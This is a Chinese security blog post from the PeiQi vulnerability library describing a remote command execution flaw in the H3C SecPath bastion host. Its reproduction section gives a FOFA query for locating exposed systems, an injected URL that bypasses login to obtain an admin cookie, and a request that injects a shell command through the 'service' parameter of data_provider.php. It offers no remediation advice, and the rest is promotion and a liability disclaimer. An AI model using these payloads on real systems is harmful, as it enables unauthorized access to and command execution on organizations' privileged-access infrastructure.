> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rt8lJaLUTVuZd187zrruMw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibicicIH182el4ZtwUTIlboZYRXjrRmK33Z3PMgtzbIn6N90u65gaT5swNxWFd56DlRDd7Ixz2MSMzVicHZKHdonpA/640?wx_fmt=jpeg)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**H3C SecParh 堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令**

**漏洞类似于齐治堡垒机  
**

**二:  漏洞影响🐇**

**H3C SecParh 堡垒机**

**三:  漏洞复现🐋**

```
app="H3C-SecPath-运维审计系统"
```

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YkLxBKcXjvA2m2Hqx2I4MYPomV41q8BWLM7jCoBibibqlurHDRtZIVkxvVibxWGH53kJE5iaSkPjTibg/640?wx_fmt=png)

**先通过任意用户登录获取 Cookie**

```
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YkLxBKcXjvA2m2Hqx2I4M2iaziauZcVytic23fmMh5ylenIeuP4rEVOeXm6MuF0BCuwwoZEMCL4eSg/640?wx_fmt=png)

```
/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YkLxBKcXjvA2m2Hqx2I4MHzBlIhGf8iaRVL6BW230n4mlwWjDicDn8wNZ5eNVwHg9KuZNpbbhXlRQ/640?wx_fmt=png)

 ****四:  关于文库🦉****

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**